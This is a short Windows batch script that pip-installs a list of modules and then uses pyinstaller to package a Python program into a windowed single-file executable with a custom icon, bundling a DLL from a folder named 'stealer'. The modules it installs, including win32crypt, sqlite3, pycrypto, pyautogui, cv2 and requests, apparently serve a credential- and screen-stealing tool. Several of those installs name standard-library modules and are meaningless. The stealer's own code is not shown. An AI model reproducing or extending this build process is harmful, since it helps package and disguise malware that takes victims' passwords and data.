@echo off

pip install time
pip install pyautogui
pip install os
pip install psutil
pip install lib-platform
pip install socket
pip install py-cpuinfo
pip install GPUtil
pip install datetime
pip install shutil
pip install os
pip install json
pip install base64
pip install sqlite3
pip install win32crypt
pip install pycrypto
pip install subprocess
pip install getpass
pip install requests
pip install re
pip install cv2

pyinstaller --noconfirm --onefile --windowed --icon "icon.ico" --add-binary "C:\Users\Евгений\stealer\target\release\stealer.dll;." "myPy\main.py"

rmdir /s /q __pycache__